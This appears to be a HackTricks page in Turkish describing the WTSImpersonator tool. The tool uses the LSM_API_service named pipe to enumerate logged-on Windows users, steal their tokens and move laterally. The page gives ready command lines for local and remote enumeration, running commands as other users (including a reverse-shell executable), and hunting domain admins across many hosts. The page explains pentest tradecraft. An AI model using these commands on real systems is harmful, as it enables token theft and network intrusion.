<details>

<summary><strong>AWS hackleme becerilerini sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile</strong>!</summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI'na**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'ı takip edin**.
* **Hacking hilelerinizi paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

**WTS Impersonator** aracı, geleneksel Token İmzalama tekniklerini atlayarak, gizlice oturum açmış kullanıcıları sıralamak ve tokenlarını ele geçirmek için **"\\pipe\LSM_API_service"** RPC Adlandırılmış boruyu kullanır. Bu yaklaşım, ağlar içinde sorunsuz yatay hareketleri kolaylaştırır. Bu teknikteki yenilik, **Omri Baso'ya aittir ve çalışması [GitHub](https://github.com/OmriBaso/WTSImpersonator)** üzerinden erişilebilir.

### Temel İşlevsellik
Araç, bir dizi API çağrısı aracılığıyla çalışır:
```powershell
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Ana Modüller ve Kullanımı
- **Kullanıcıları Sıralama**: Araçla yerel ve uzaktaki kullanıcıları sıralamak mümkündür. Her iki senaryo için de aşağıdaki komutlar kullanılır:
- Yerel olarak:
```powershell
.\WTSImpersonator.exe -m enum
```
- Uzaktan, IP adresi veya ana bilgisayar adı belirterek:
```powershell
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Komutları Yürütme**: `exec` ve `exec-remote` modülleri işlev görmek için bir **Hizmet** bağlamı gerektirir. Yerel yürütme için sadece WTSImpersonator yürütülebilir dosyası ve bir komut gereklidir:
- Yerel komut yürütme örneği:
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- Bir hizmet bağlamı elde etmek için PsExec64.exe kullanılabilir:
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Uzaktan Komut Yürütme**: Uygun izinlerle yürütme yapabilen bir PsExec.exe gibi uzaktan bir hizmet oluşturup yüklemeyi içerir.
- Uzaktan yürütme örneği:
```powershell
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **Kullanıcı Avı Modülü**: Birden fazla makinede belirli kullanıcıları hedef alarak kimlik bilgileriyle kod yürütme yapar. Bu, özellikle birkaç sistemde yerel yönetici haklarına sahip olan Etki Alanı Yöneticilerini hedeflemek için kullanışlıdır.
- Kullanım örneği:
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```


<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı yapmak veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi Twitter'da 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live) takip edin.
* Hacking hilelerinizi paylaşarak **HackTricks** ve **HackTricks Cloud** github depolarına PR göndererek katkıda bulunun.

</details>
